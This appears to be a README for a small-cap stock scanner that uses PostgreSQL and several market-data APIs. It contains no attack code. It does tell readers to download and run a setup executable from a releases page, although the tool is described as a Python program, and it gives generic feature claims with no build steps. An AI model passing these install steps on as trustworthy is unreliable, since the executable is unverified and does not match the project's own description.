# 📈 small-caps-scanner - Scan Stocks for Quick Insights

## 🚀 Getting Started

Welcome to small-caps-scanner! This tool helps you track stock market movements for small cap stocks. You can find top gainers and active stocks in both pre-market and regular sessions. Let’s get you set up so you can enjoy its features.

## 🛠️ System Requirements

Before you begin, make sure your computer meets the following requirements:

- **Operating System:** Windows, macOS, or Linux
- **Python:** Version 3.6 or higher (this tool requires Python to run)
- **Database:** PostgreSQL
- **Internet Connection:** Required for fetching stock data

## 📥 Download

To download small-caps-scanner, visit the link below:

[![Download small-caps-scanner](https://img.shields.io/badge/Download-small--caps--scanner-brightgreen)](https://github.com/Usagic9631/small-caps-scanner/releases)

## 📥 Download & Install

1. Click the link below to visit the Releases page and download the application.

   [Download small-caps-scanner here](https://github.com/Usagic9631/small-caps-scanner/releases)

2. On the Releases page, find the latest version. Look for a file named something like `small-caps-scanner-setup.exe` or `small-caps-scanner.zip`.

3. Click on the file to download it to your computer.

4. Once the download is complete, locate the file in your downloads folder.

5. If you downloaded a ZIP file, extract its contents using a tool like WinRAR or built-in operating system tools.

6. Run the setup file (if it is an executable) or follow the instructions provided in the extracted folder.

7. Follow the prompts in the installer to complete the installation.

8. After installation, you can find small-caps-scanner in your applications.

## 🔌 Set Up Your Database

To fully utilize small-caps-scanner, you need to set up a PostgreSQL database.

1. If you don't have PostgreSQL installed, download it from the official PostgreSQL website.
2. Install PostgreSQL following the instructions relevant to your operating system.
3. After installation, create a new database for small-caps-scanner.

   - Use the following SQL command in your PostgreSQL shell:
     ```sql
     CREATE DATABASE stock_data;
     ```

4. Configure your database connection in the application's settings. You will need the database name, user, and password you set up during installation.

## 🌐 API Integration

small-caps-scanner integrates with several APIs to gather stock data. Here’s how to set it up:

1. **Charles Schwab API**: Sign up for a Charles Schwab account. Follow their instructions to generate an API key.

2. **Yahoo Finance**: No sign-up is needed; the application uses their public API.

3. **StockAnalysis.com**: Similar to Yahoo Finance, you can access their public data directly.

4. Insert your Charles Schwab API key into the application settings.

## 📊 Using small-caps-scanner

Once you have everything set up, it's time to start using small-caps-scanner:

1. Launch the application.
2. Select the session you want to analyze: pre-market or regular market.
3. Click on "Scan" to view the top gainers and movers. 
4. Review the comprehensive stock data and performance indexes.
5. You can export the results to a CSV file for your records.

## 🔍 Features

- **Real-time stock data**: Fetches and displays current market information.
- **Performance indexing**: Tracks over 40 performance metrics for in-depth analysis.
- **Custom alerts**: Set up alerts for specific stock movements or price changes.
- **User-friendly interface**: Navigate easily through your stock data.

## ✅ Helpful Tips

- Keep your version of Python and PostgreSQL updated for the best performance.
- Check the application settings to customize your data preferences.
- Regularly visit the Releases page for updates and new features.

## 📕 Resources

For more information and support, you can access the following resources:

- [GitHub Repository](https://github.com/Usagic9631/small-caps-scanner)
- [Charles Schwab API Documentation](https://www.schwab.com/api-documentation)
- [PostgreSQL Documentation](https://www.postgresql.org/docs/)

If you have any questions or run into issues, please open an issue in the GitHub repository. Happy scanning!